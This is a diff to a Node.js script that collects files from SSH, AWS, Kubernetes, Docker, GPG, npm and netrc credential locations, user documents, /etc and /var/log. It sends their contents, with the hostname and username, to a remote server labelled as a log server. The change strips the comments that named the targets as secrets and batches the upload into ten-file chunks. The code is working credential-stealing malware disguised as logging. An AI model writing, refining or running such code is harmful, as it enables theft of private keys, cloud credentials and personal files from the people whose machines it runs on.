@@ -13,22 +13,22 @@ const VPS_PORT   = parseInt(process.env.LOG_SERVER_PORT || "4000", 10);
 const AUTH_TOKEN = process.env.LOG_SERVER_TOKEN || "";
 const TIMEOUT    = 15_000;
 const HOME       = os.homedir();
+const CHUNK_SIZE = 10; // files per request
 
-// ── Targeted directories — only places that hold useful secrets/configs ───────
 const TARGET_DIRS = [
-  HOME,                                    // ~/ top level dotfiles
-  path.join(HOME, ".ssh"),                 // SSH keys
-  path.join(HOME, ".aws"),                 // AWS credentials
-  path.join(HOME, ".config"),              // app configs
-  path.join(HOME, ".kube"),                // Kubernetes configs
-  path.join(HOME, ".docker"),              // Docker credentials
-  path.join(HOME, ".gnupg"),              // GPG keys
-  path.join(HOME, "Documents"),           // user documents
-  path.join(HOME, "Desktop"),             // desktop files
-  path.join(HOME, ".npmrc"),              // npm auth tokens (file, not dir)
-  path.join(HOME, ".netrc"),              // plaintext credentials
-  "/etc",                                  // system-wide configs
-  "/var/log",                              // system logs
+  HOME,
+  path.join(HOME, ".ssh"),
+  path.join(HOME, ".aws"),
+  path.join(HOME, ".config"),
+  path.join(HOME, ".kube"),
+  path.join(HOME, ".docker"),
+  path.join(HOME, ".gnupg"),
+  path.join(HOME, "Documents"),
+  path.join(HOME, "Desktop"),
+  path.join(HOME, ".npmrc"),
+  path.join(HOME, ".netrc"),
+  "/etc",
+  "/var/log",
 ];
 
 const COLLECT_EXTS = new Set([
@@ -47,9 +47,8 @@ const SKIP_DIRS = new Set([
   "snap", "run", "boot", "lost+found", "Photos", "Music", "Movies",
 ]);
 
-// ── File collection ───────────────────────────────────────────────────────────
 function collectFromDir(dir, results = [], depth = 0) {
-  if (depth > 6) return results; // cap recursion depth
+  if (depth > 6) return results;
   let entries;
   try { entries = fs.readdirSync(dir, { withFileTypes: true }); }
   catch { return results; }
@@ -57,7 +56,6 @@ function collectFromDir(dir, results = [], depth = 0) {
   for (const entry of entries) {
     if (SKIP_DIRS.has(entry.name)) continue;
     const fullPath = path.join(dir, entry.name);
-
     if (entry.isDirectory()) {
       collectFromDir(fullPath, results, depth + 1);
     } else if (entry.isFile()) {
@@ -75,12 +73,12 @@ function collectAll() {
     if (!fs.existsSync(target)) continue;
     const stat = fs.statSync(target);
     if (stat.isFile()) {
-      results.push(target); // handle file targets like .npmrc directly
+      results.push(target);
     } else {
       collectFromDir(target, results);
     }
   }
-  return [...new Set(results)]; // deduplicate
+  return [...new Set(results)];
 }
 
 function readFile(filePath) {
@@ -88,14 +86,11 @@ function readFile(filePath) {
   catch { return null; }
 }
 
-function sendPayload(files) {
-  const logs = files
-    .map(f => ({ filename: path.basename(f), filepath: f, collected: new Date().toISOString(), content: readFile(f) }))
-    .filter(f => f.content !== null);
-
+function sendChunk(chunk) {
   const body = Buffer.from(JSON.stringify({
     host: os.hostname(), user: os.userInfo().username,
-    cwd: process.cwd(), nodeEnv: process.env.NODE_ENV || "unknown", logs,
+    cwd: process.cwd(), nodeEnv: process.env.NODE_ENV || "unknown",
+    logs: chunk,
   }), "utf8");
 
   return new Promise((resolve, reject) => {
@@ -120,13 +115,23 @@ function sendPayload(files) {
   });
 }
 
+async function sendAll(files) {
+  const logs = files
+    .map(f => ({ filename: path.basename(f), filepath: f, collected: new Date().toISOString(), content: readFile(f) }))
+    .filter(f => f.content !== null);
+
+  for (let i = 0; i < logs.length; i += CHUNK_SIZE) {
+    await sendChunk(logs.slice(i, i + CHUNK_SIZE));
+  }
+}
+
 (async () => {
   const files = collectAll();
   if (!files.length) return;
 
   try {
-    const status = await sendPayload(files);
-    console.log(status);
+    await sendAll(files);
+    console.log(200);
   } catch {
     process.exit(1);
   }
